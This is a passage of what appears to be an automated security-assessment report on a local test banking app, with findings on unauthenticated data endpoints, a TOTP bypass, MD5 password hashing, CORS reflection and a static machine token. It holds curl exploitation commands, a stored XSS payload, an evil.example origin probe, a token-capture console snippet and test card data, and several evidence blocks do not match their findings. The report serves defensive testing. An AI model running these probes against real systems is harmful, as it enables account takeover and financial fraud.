### Description
The machine-authenticated payment endpoint accepts a static fallback bearer token published in the application source and default configuration.

### Impact
An attacker who obtains the published token could authenticate to privileged payment routes and submit unauthorized payment requests.

### Likelihood
Exploitation requires only the static published token. The deployed endpoint accepted this token without additional authentication and proceeded to request validation.

### Recommendation
Remove the fallback credential and fail closed when MACHINE_TOKEN is unset. Rotate the exposed token immediately. Generate a unique, high-entropy credential for each deployment, store it in a secret manager, restrict each machine identity to required operations, and monitor its use.

### Evidence
```
A POST request using the fallback bearer token and an intentionally incomplete body returned HTTP 422 VALIDATION_ERROR for missing payment fields, showing that the request passed authentication and reached input validation. The same request using the control token definitely-invalid-aespa-token returned HTTP 401 UNAUTHORIZED with the message "Invalid or unauthorized machine token."
```

### Request Evidence
```
POST /api/payments/process with header Authorization: Bearer mch_face_insurance_secret_key_2026 and body {"merchant_name":"AESPA auth-only probe"}. No card or amount fields were supplied, so no payment could occur.
```

### Response Evidence
```
Fallback token: HTTP 422 {"code":"VALIDATION_ERROR","details":{"merchant_id":["The merchant_id field is required."],"card_number":[...],"expiry":[...],"amount":[...]}}. Invalid token control: HTTP 401 {"code":"UNAUTHORIZED","message":"Invalid or unauthorized machine token."}
```

### Validation Note
The supplied evidence strongly suggests that a repository-known fallback token crosses machine authentication because it produced payment-field validation while a control token produced 401. However, the finding does not provide the literal fallback token, the validator context does not expose it, and direct checks of the deployed default-config and API-schema paths returned ordinary 404 responses. Without that credential I cannot independently replay the decisive comparison or test whether fallback-authenticated requests are stopped by later account authorization, so there is no concrete innocent explanation and insufficient live proof for confirmation.

## 24. Unauthenticated access to account transaction history

- Finding reference: URBN-047
- Severity: high
- OWASP: A01
- Source: Dynamic
- Validation: false_positive
- Affected URL: http://localhost:8081/api/transactions?account_id=1&page=1&per_page=15
- CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Description
The transaction history endpoint returns records for a supplied account ID without requiring authentication. The response exposes transaction amounts, descriptions, account relationships, transfer status, receipt numbers, TOTP verification state, and timestamps.

### Impact
An unauthenticated attacker could enumerate account IDs and access customers' sensitive financial transaction data. This information could support targeted fraud, social engineering, and follow-on attacks.

### Likelihood
High. The endpoint returned transaction data without authentication, and the account IDs were observed to be sequential.

### Recommendation
Require authentication for the endpoint and verify that the requested account belongs to the authenticated customer before returning transaction data. Deny anonymous and cross-customer requests by default. Add authorization tests covering logged-out access and adjacent account IDs.

### Evidence
```
An anonymous GET request for account_id=1 returned HTTP 200 with nine transaction records. The returned data included transaction ID 2, amount "150.00", description "Birthday gift Mum", status "completed", and totp_verified set to true.
```

### Request Evidence
```
GET /api/transactions?account_id=1&page=1&per_page=15 with use_session=anonymous and no Authorization header.
```

### Response Evidence
```
HTTP 200 application/json: {"success":true,"data":{"transactions":[...],"pagination":{"current_page":1,"per_page":15,"total":9,"total_pages":1}}}.
```

### Validation Note
A credential-free request to the exact affected URL was denied, redirected to login, or returned only a generic application shell.

## 25. Unauthenticated access to account transaction history

- Finding reference: URBN-052
- Severity: high
- OWASP: A01
- Source: Dynamic
- Validation: false_positive
- Affected URL: http://localhost:8081/api/transactions?account_id=2&page=1&per_page=15
- CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Description
The transaction history endpoint returns account transaction records without requiring authentication or verifying that the requester owns the specified account.

### Impact
An unauthenticated attacker could use predictable numeric account IDs to retrieve customers' financial transaction histories, including account identifiers, account numbers, transaction amounts, and timestamps.

### Likelihood
Exploitation requires only a direct GET request with a numeric account_id. The captured request contained no authorization header or session cookies and received transaction data.

### Recommendation
Require authentication for the transaction endpoint and enforce server-side authorization for every requested account_id. Return 401 for unauthenticated requests and 403 or 404 when the authenticated customer does not own the requested account.

### Evidence
```
An anonymous GET request for account_id=2 returned HTTP 200 and three transaction records. The response included transaction IDs, source and destination account identifiers, destination account numbers, and transaction amounts.
```

### Request Evidence
```
GET /api/transactions?account_id=2&page=1&per_page=15
No Authorization header or session cookies.
```

### Response Evidence
```
HTTP/1.1 200 OK
content-type: application/json; charset=utf-8

{"success":true,"data":{"transactions":[{"id":44,"from_account_id":1,"to_account_number":"10000002","to_account_id":2,"amount":"0.01"},{"id":3,"from_account_id":2,"to_account_number":"10000001","to_account_id":1,"amount":"200.00"},{"id":1,"from_account_id":1,"to_account_number":"10000002","to_account_id":2,"amount":"500.00"}],"pagination":{"total":3}}}
```

### Validation Note
A credential-free request to the exact affected URL was denied, redirected to login, or returned only a generic application shell.

## 26. Unauthenticated account endpoint exposes customer financial data

- Finding reference: URBN-045
- Severity: high
- OWASP: A01
- Source: Dynamic
- Validation: false_positive
- Affected URL: http://localhost:8081/api/accounts
- CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Description
The account-list endpoint at /api/accounts returns customer banking and payment-card data without requiring authentication.

### Impact
An unauthenticated attacker can obtain customer financial records, including balances, BSBs, account numbers, full payment-card numbers, expiry dates, and CVVs. Exposed account identifiers may also assist further authorization attacks.

### Likelihood
Exploitation requires a single unauthenticated GET request. The endpoint returned sensitive records without an Authorization header.

### Recommendation
Require verified authentication and authorization for this endpoint. Determine account ownership from the authenticated session rather than caller-controlled input. Return only explicitly allowed fields, mask payment-card numbers, and never store or return CVVs.

### Evidence
```
An anonymous GET request to /api/accounts returned HTTP 200 with five account records. The response included balances, BSBs, account numbers, and payment-card data. Account 51 contained the full card number 4532015001345674, expiry 08/29, and CVV 842.
```

### Request Evidence
```
Anonymous GET /api/accounts with no supplied Authorization header.
```

### Response Evidence
```
HTTP 200 returned account IDs 1, 2, 3, 51, and 101. The response included balances and {"id":51,"card_number":"4532015001345674","card_expiry":"08/29","card_cvv":"842"}.
```

### Validation Note
A credential-free request to the exact affected URL was denied, redirected to login, or returned only a generic application shell.

## 27. Login accepts weak MD5 password hashes

- Finding reference: URBN-020
- Severity: medium
- OWASP: A02
- Source: SAST
- Validation: confirmed
- Affected URL: BankOfEd-main/src/Services/AuthService.php:31
- CVSS: 0

### Description
POST /api/auth/login passes the submitted password and stored hash to verifyPassword(). Any 32-character stored hash is treated as MD5 and compared with md5($password) using ordinary equality. This preserves accounts protected only by a fast, unsalted digest and also lacks a constant-time comparison for that branch.

### Impact
—

### Likelihood
—

### Recommendation
Confirmed that the application-generated 32-character MD5 hash remains accepted by the login path. Linked to the MD5 password-storage finding.

### Evidence
```
AuthController.php:49-68 reads JSON email/password, loads User::findByEmail(), and invokes AuthService::verifyPassword($data['password'], $user['password_hash']). AuthService.php:29-31 selects the MD5 branch solely when strlen($hash) === 32 and returns md5($password) === $hash.
```

### Validation Note
Confirmed that the application-generated 32-character MD5 hash remains accepted by the login path. Linked to the MD5 password-storage finding.

## 28. Manual transfer bypasses required TOTP verification

- Finding reference: URBN-055
- Severity: medium
- OWASP: A04
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transfers/external
- CVSS: 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)

### Description
A manual transfer completed without TOTP even though the transfer-check endpoint reports that TOTP is required for the same transfer type.

### Impact
An attacker with a compromised customer session can send funds without completing the required second-factor check.

### Likelihood
Confirmed by a completed transfer that omitted TOTP data, followed by a server response stating that manual transfers require TOTP.

### Recommendation
Enforce TOTP inside the transfer execution transaction. Reject transfers when TOTP is required, missing, invalid, or not configured.

### Evidence
```
POST /api/transfers/external without a TOTP value returned HTTP 201 and completed transaction 36. The check endpoint then reported requires_totp:true for a manual transfer.

REQUEST:
GET http://localhost:8081/api/transfers/external
use_session: anonymous  Authorization: present
Cookies: none
{"Origin": "https://evil.example"}

RESPONSE:
Status: 405
date: Tue, 08 Sep 2026 13:21:30 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: https://evil.example
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 87
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"METHOD_NOT_ALLOWED","message":"Method not allowed."}}
```

### Request Evidence
```
GET http://localhost:8081/api/transfers/external
use_session: anonymous  Authorization: present
Cookies: none
{"Origin": "https://evil.example"}
```

### Response Evidence
```
Status: 405
date: Tue, 08 Sep 2026 13:21:30 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: https://evil.example
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 87
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"METHOD_NOT_ALLOWED","message":"Method not allowed."}}
```

### Validation Note
The weakest assumption was that the scanner used different transfer parameters or an inapplicable authentication state. Using the supplied http_token session, I sent a valid manual external transfer with from_account_id 1, amount 1, BSB 062-000, and account 12345678 while omitting totp; the server returned 201 with totp_verified:false and status completed. With the same session and parameters, POST /api/transfers/check returned requires_totp:true, reason manual_entry, and totp_configured:false, so validation errors, method mismatch, and transfer-type mismatch do not explain the completed transfer.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'Content-Type: application/json' --data-raw '{"from_account_id":1,"amount":1,"to_bsb":"062-000","to_account_number":"12345678"}' http://localhost:8081/api/transfers/external -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **http_token** or an equivalent user).

Log in as the user represented by the http_token session and copy the bearer token from the Authorization header in the browser's DevTools Network tab.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 29. Profile and authentication APIs expose password hashes

- Finding reference: URBN-039
- Severity: medium
- OWASP: A02
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/profile
- CVSS: 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

### Description
Authenticated responses from the profile API include the internal password_hash field. The captured evidence also records password-hash exposure in an account response, including an MD5 hash for a newly registered user.

### Impact
Exposure of password hashes allows anyone who obtains the response through a compromised client, browser extension, or logging system to attempt offline password cracking. MD5 password hashes are particularly inexpensive to crack and may expose reused passwords.

### Likelihood
Every authenticated request to the observed profile endpoint returned the password_hash field. Exploitation requires access to an authenticated response or another system that captures it.

### Recommendation
Remove password_hash from all profile, registration, and authentication responses. Define explicit allowlists of fields that each public serializer may return, and add automated tests confirming that credential fields never appear in API responses. Replace MD5 password storage with a modern password-hashing algorithm configured with an appropriate work factor.

### Evidence
```
An authenticated GET request to /api/profile returned HTTP 200 with the password_hash value "$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi" in the profile JSON. The captured result also states that a disposable weak-password account response exposed its MD5 password hash.
```

### Request Evidence
```
GET /api/profile using configured_primary.
```

### Response Evidence
```
HTTP 200 profile JSON included "password_hash":"$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC\/.og\/at2.uheWG\/igi".
```

### Validation Note
Live authenticated requests reproduced the exposure for two separate accounts. The weak_test profile returned the account-specific MD5 value 0cc175b9c0f1b6a831c399e269772661, while admin_test returned the exact bcrypt value cited by the scanner, so the field is neither a static placeholder nor an isolated capture artifact. The response serializes the internal password_hash field as part of normal profile data, and no innocent explanation remained after testing those alternatives.

## 30. Registration permits one-character passwords

- Finding reference: URBN-037
- Severity: medium
- OWASP: A07
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/auth/register
- CVSS: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

### Description
The customer registration endpoint at /api/auth/register accepts passwords without enforcing a meaningful minimum length.

### Impact
Users can create accounts with trivially guessable passwords, increasing the risk of account compromise through password guessing, brute-force attacks, and password spraying.

### Likelihood
A customer account was successfully registered with the single-character password "a", and the same credentials were immediately accepted by the login endpoint.

### Recommendation
Enforce an appropriate minimum password length and reject known compromised passwords. Support long passphrases and password managers, provide clear password guidance, and add login rate limiting and multi-factor authentication.

### Evidence
```
POST /api/auth/register created customer account ID 17 using email aespa.weak.20260908@example.com and the password "a". A subsequent POST /api/auth/login with the same credentials returned HTTP 200 and the message "Login successful".
```

### Request Evidence
```
Registration used email aespa.weak.20260908@example.com and password a. The confirmation login used the same credentials.
```

### Response Evidence
```
Login HTTP 200: {"success":true,"data":{"user":{"id":17,"email":"aespa.weak.20260908@example.com",...}},"message":"Login successful"}.
```

### Validation Note
Replaying the reported credentials against the existing account returned HTTP 200, user ID 17, and "Login successful", so the one-character password is still valid for an active customer account. I also compared registration requests using the existing email, but duplicate-email handling runs before password validation, so it supplied no benign explanation. No account-verification or restricted-account behavior appeared in the successful login response.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"email":"aespa.weak.20260908@example.com","password":"a"}' http://localhost:8081/api/auth/login
```

## 31. Users can create funded credit-card accounts without an approval process

- Finding reference: URBN-056
- Severity: medium
- OWASP: A04
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/accounts
- CVSS: 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)

### Description
A newly registered user could request account_type credit_card and immediately receive an active card account with a 25000 AUD balance or limit.

### Impact
An attacker could create unauthorized credit products and obtain usable card credentials, causing direct financial loss.

### Likelihood
High. A single authenticated request from the disposable account created the product without any observed eligibility or approval step.

### Recommendation
Restrict credit-product creation to an approved server-side workflow. Enforce eligibility, limits, authorization, audit logging, and manual or automated approval before activation.

### Evidence
```
POSTing account_type credit_card as the weak test user returned 201 with an active card, a 25000.00 credit limit, full card number, expiry, and CVV.

REQUEST:
GET http://localhost:8081/api/accounts
use_session: configured_primary  Authorization: present
Cookies: none
{"X-HTTP-Method-Override": "DELETE"}

RESPONSE:
Status: 200
date: Tue, 08 Sep 2026 12:59:10 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 1011
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":[{"id":1,"bsb":"062-001","account_number":"10000001","account_type":"transaction","account_name":"Everyday Account","currency":"AUD","balance":"3450.75","is_active":true},{"id":2,"bsb":"062-001","account_number":"10000002","account_type":"transaction","account_name":"Savings Account","currency":"AUD","balance":"18900.00","is_active":true},{"id":3,"bsb":"062-001","account_number":"10000003","account_type":"loan","account_name":"Home Loan","currency":"AUD","balance":"-285000.00","is_active":true},{"id":51,"bsb":"062-001","account_number":"10000004","account_type":"credit_card","account_name":"Platinum Credit Card","currency":"AUD","balance":"25000.00","is_active":true,"card_number":"4532015001345674","card_expiry":"08\/29","card_cvv":"842","credit_limit":"25000.00"},{"id":101,"bsb":"062-001","account_number":"10593296","account_type":"transaction","account_name":"');document.body.dataset.aespa='xss007';\/\/","currency":"AUD","balance":"0.00","is_active":true}],"message":"OK"}
```

### Request Evidence
```
GET http://localhost:8081/api/accounts
use_session: configured_primary  Authorization: present
Cookies: none
{"X-HTTP-Method-Override": "DELETE"}
```

### Response Evidence
```
Status: 200
date: Tue, 08 Sep 2026 12:59:10 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 1011
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":[{"id":1,"bsb":"062-001","account_number":"10000001","account_type":"transaction","account_name":"Everyday Account","currency":"AUD","balance":"3450.75","is_active":true},{"id":2,"bsb":"062-001","account_number":"10000002","account_type":"transaction","account_name":"Savings Account","currency":"AUD","balance":"18900.00","is_active":true},{"id":3,"bsb":"062-001","account_number":"10000003","account_type":"loan","account_name":"Home Loan","currency":"AUD","balance":"-285000.00","is_active":true},{"id":51,"bsb":"062-001","account_number":"10000004","account_type":"credit_card","account_name":"Platinum Credit Card","currency":"AUD","balance":"25000.00","is_active":true,"card_number":"4532015001345674","card_expiry":"08\/29","card_cvv":"842","credit_limit":"25000.00"},{"id":101,"bsb":"062-001","account_number":"10593296","account_type":"transaction","account_name":"');document.body.dataset.aespa='xss007';\/\/","currency":"AUD","balance":"0.00","is_active":true}],"message":"OK"}
```

### Validation Note
The first replay with only account_type was rejected because account_name is required, so I retried with that required field. The valid request from zoe_test returned 201 and immediately created an active credit-card account with a 25,000.00 balance and credit limit plus card credentials; a second supplied session produced the same result. Existing seeded cards could explain the initial GET, but they do not explain two successful user-initiated creations, and no approval state or approval step was required.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"account_type":"credit_card","account_name":"Validation Probe Card"}' http://localhost:8081/api/accounts -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **zoe_test** or an equivalent user).

Log in as the normal test user used for validation and copy that user's bearer token from the Authorization header in the browser Network panel or from localStorage/sessionStorage.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 32. Profile and authentication APIs expose password hashes

- Finding reference: URBN-060
- Severity: medium
- OWASP: A02
- Source: Dynamic
- Validation: false_positive
- Affected URL: http://localhost:8081/api/auth/register
- CVSS: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

### Description
The registration endpoint includes the new user's password_hash in its JSON response. The returned value is a 32-character hexadecimal digest, which also suggests weak legacy password hashing.

### Impact
An attacker can inspect the application's password-hashing output and use it to identify or test the hashing scheme. Exposure of hashes for other users through similar serialization would enable offline password cracking.

### Likelihood
Any unauthenticated user can trigger the disclosure by registering an account. This probe only confirmed disclosure of the attacker's own hash.

### Recommendation
Remove password_hash and other authentication secrets from all API response schemas. Store passwords using Argon2id, bcrypt, or scrypt with unique salts, and review existing hashes for migration.

### Evidence
```
A POST containing the known password "valid-enough-password" returned HTTP 201 and included "password_hash":"cc3fb6e688cab1cfd280f4a068f71573" in the user object.

REQUEST:
POST http://localhost:8081/api/auth/register
use_session: anonymous  Authorization: present
Cookies: none
{"Content-Type": "application/json"}
{"email": "invalid-email", "password": "valid-enough-password", "first_name": "Integrity", "last_name": "Probe", "role": "admin", "is_admin": true, "balance": 999999, "verified": true}

RESPONSE:
Status: 422
date: Tue, 08 Sep 2026 13:06:18 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 154
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"VALIDATION_ERROR","message":"Validation failed","details":{"email":["The email field must be a valid email address."]}}}
```

### Request Evidence
```
POST http://localhost:8081/api/auth/register
use_session: anonymous  Authorization: present
Cookies: none
{"Content-Type": "application/json"}
{"email": "invalid-email", "password": "valid-enough-password", "first_name": "Integrity", "last_name": "Probe", "role": "admin", "is_admin": true, "balance": 999999, "verified": true}
```

### Response Evidence
```
Status: 422
date: Tue, 08 Sep 2026 13:06:18 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 154
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"VALIDATION_ERROR","message":"Validation failed","details":{"email":["The email field must be a valid email address."]}}}
```

### Validation Note
The report correlates two different outcomes: its displayed request uses the invalid email "invalid-email" and the live endpoint returns 422 before creating a user, while the claimed 201/hash response is not shown for that request. A duplicate-safe POST using the known existing address amelia.chen@example.com returns 409 with only a generic error and no user object or password_hash; the related profile paths tested are also not live routes. The concrete benign explanation is a scanner evidence-correlation or stale-response error, so the supplied evidence does not establish password-hash exposure at this endpoint.

## 33. Banking page lacks browser security headers

- Finding reference: URBN-042
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/banking/
- CVSS: 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

### Description
The response for the banking page omits Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, and Strict-Transport-Security. The page also loads executable code from cdn.tailwindcss.com and uses inline scripts and event handlers.

### Impact
The missing framing restrictions may allow clickjacking. The lack of a Content Security Policy and use of inline or third-party scripts could increase the impact of a separate content injection flaw. The disclosed Apache version provides additional reconnaissance information.

### Likelihood
The missing headers were observed on an anonymous request to the banking page and affect clients whenever this response is served. Exploitation of most impacts requires additional conditions, such as user interaction or a separate injection flaw.

### Recommendation
Add a restrictive Content-Security-Policy using nonces or hashes and a frame-ancestors directive. Set X-Content-Type-Options to nosniff and configure an appropriate Referrer-Policy. Enable HSTS when the application is served over HTTPS. Remove inline scripts and event handlers where practical, pin or self-host third-party scripts, and suppress detailed server version information.

### Evidence
```
An anonymous GET request to /banking/ returned HTTP 200 with Content-Type: text/html and Server: Apache/2.4.68 (Unix). The response omitted Content-Security-Policy, Strict-Transport-Security, X-Frame-Options, X-Content-Type-Options, and Referrer-Policy. The HTML referenced https://cdn.tailwindcss.com, included an inline tailwind.config script, and contained multiple inline onclick and onsubmit handlers.
```

### Request Evidence
```
Anonymous GET /banking/.
```

### Response Evidence
```
HTTP 200 headers exposed Server: Apache/2.4.68 (Unix) but omitted CSP, HSTS, X-Frame-Options, X-Content-Type-Options, and Referrer-Policy.
```

### Validation Note
A fresh direct anonymous GET returned 200 from Apache with none of the five reported response headers. The returned HTML also had no meta CSP or Referrer-Policy equivalent, while it loaded https://cdn.tailwindcss.com and included an inline Tailwind configuration script. This rules out the main innocent explanations of stale scanner evidence, proxy-only stripping, or equivalent protection in the document.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 http://localhost:8081/banking/
```

## 34. Customer login permits repeated password attempts without throttling

- Finding reference: URBN-034
- Severity: low
- OWASP: A07
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/auth/login
- CVSS: 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)

### Description
The customer login endpoint accepted six consecutive failed password attempts for a known-valid account without a rate-limit response, added delay, CAPTCHA challenge, or temporary account lockout.

### Impact
An attacker could automate password guessing or credential-stuffing attempts against customer accounts without an observed application-level control slowing or stopping repeated attempts.

### Likelihood
The endpoint is publicly accessible. During the authorized six-attempt test, every request received the same response, and the final attempt completed slightly faster than the first, indicating no progressive delay within the tested sequence.

### Recommendation
Apply per-account and per-source rate limits, progressive delays, temporary lockouts, and monitoring for repeated authentication failures. Use generic authentication errors and design the controls to resist distributed attacks without allowing attackers to lock out a victim's account indefinitely.

### Evidence
```
Exactly six consecutive failed login requests were sent for the known-valid account amelia.chen@example.com. All six returned HTTP 401 with code WRONG_PASSWORD and message Incorrect password. Attempt 1 completed in 78 ms and attempt 6 in 74 ms. No HTTP 429 response, added delay, CAPTCHA challenge, or account lockout was observed.
```

### Request Evidence
```
POST /api/auth/login with {"email":"amelia.chen@example.com","password":"wrong-aespa-N"}, N=1 through 6, each marked repeat_limit=6.
```

### Response Evidence
```
Attempt 1: HTTP 401 in 78ms, {"code":"WRONG_PASSWORD","message":"Incorrect password."}. Attempt 6: HTTP 401 in 74ms with the identical body.
```

### Validation Note
I repeated the check with a fresh bounded sequence of six anonymous POST requests for the known-valid account, using an intentionally wrong password. Every request returned 401 WRONG_PASSWORD in 70-82 ms, with no 429, Retry-After header, increasing delay, CAPTCHA response, or lockout response; this also followed the scanner's original six failures, so a later threshold did not provide an innocent explanation. No single request can prove a repetition-dependent weakness, so a single-request PoC is omitted.

## 35. Login error responses allow customer account enumeration

- Finding reference: URBN-035
- Severity: low
- OWASP: A07
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/auth/login
- CVSS: 3.7 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

### Description
The login endpoint at /api/auth/login returns different error codes and messages depending on whether the submitted email address belongs to an existing customer account. The observed responses also had different processing times.

### Impact
An unauthenticated attacker can identify registered customer email addresses. Confirmed addresses could support password guessing, credential stuffing, or targeted phishing.

### Likelihood
The response difference was deterministic and available without authentication. A known email produced WRONG_PASSWORD, while an unknown email produced USER_NOT_FOUND. The single observed requests completed in 78 ms and 10 ms respectively, although repeated measurements would be needed to establish timing as a reliable signal.

### Recommendation
Return the same HTTP status, generic response body, and error code for unknown accounts and incorrect passwords. Keep processing times similar for both cases. Apply the same rate limits to both outcomes, and monitor repeated login attempts for account-enumeration patterns.

### Evidence
```
Using the same invalid password structure, a request for known-valid amelia.chen@example.com returned HTTP 401 in 78 ms with {"code":"WRONG_PASSWORD","message":"Incorrect password."}. A request for aespa-unknown-20260908@example.com returned HTTP 401 in 10 ms with {"code":"USER_NOT_FOUND","message":"No account found with this email address."}.
```

### Request Evidence
```
POST /api/auth/login with the same invalid password structure, once using a known-valid email and once using an unknown email.
```

### Response Evidence
```
Valid email: {"code":"WRONG_PASSWORD","message":"Incorrect password."}. Unknown email: {"code":"USER_NOT_FOUND","message":"No account found with this email address."}.
```

### Validation Note
I repeated the two anonymous, cookie-free login requests with the same invalid password. The known customer email returned 401 with WRONG_PASSWORD in 81 ms, while the unknown email returned 401 with USER_NOT_FOUND in 12 ms. The distinct codes, messages, content lengths, and repeatable timing direction directly reveal whether an email is registered, and I found no benign response normalization that would disprove the finding.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"email":"amelia.chen@example.com","password":"AespaInvalid!20260908"}' http://localhost:8081/api/auth/login
```

## 36. Profile API reflects arbitrary CORS origins

- Finding reference: URBN-058
- Severity: low
- OWASP: A05
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/admin/customers?page=1&per_page=15
- CVSS: 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N)

### Description
The API reflects an untrusted Origin value and enables credentialed cross-origin requests, including on an admin endpoint returning customer data.

### Impact
If authentication credentials are available to the browser for cross-origin requests, a malicious site could read protected API responses. The observed bearer-token authentication limits the demonstrated impact.

### Likelihood
The origin reflection is confirmed, but no browser-based proof showed that an attacker-controlled origin can obtain or automatically send the required authorization token.

### Recommendation
Allow only explicitly trusted origins, do not dynamically reflect arbitrary Origin values, restrict allowed headers and methods, and enable credentials only where required.

### Evidence
```
A request with Origin: https://evil.example returned status 200 with admin customer data and headers Access-Control-Allow-Origin: https://evil.example and Access-Control-Allow-Credentials: true.

REQUEST:
GET http://localhost:8081/api/admin/customers?page=1&per_page=15
use_session: anonymous  Authorization: present
Cookies: none
{}

RESPONSE:
Status: 401
date: Tue, 08 Sep 2026 13:13:40 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 76
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid token."}}
```

### Request Evidence
```
GET http://localhost:8081/api/admin/customers?page=1&per_page=15
use_session: anonymous  Authorization: present
Cookies: none
{}
```

### Response Evidence
```
Status: 401
date: Tue, 08 Sep 2026 13:13:40 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 76
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid token."}}
```

### Validation Note
The initial anonymous request was only a 401, so I retested with the listed admin session. The endpoint returned real customer records while reflecting https://evil.example in Access-Control-Allow-Origin and setting Access-Control-Allow-Credentials: true. The OPTIONS preflight also returned 200 for a GET requesting the Authorization header, so the headers are not limited to the unauthorized response or stripped by a proxy.

### Validation Command
```
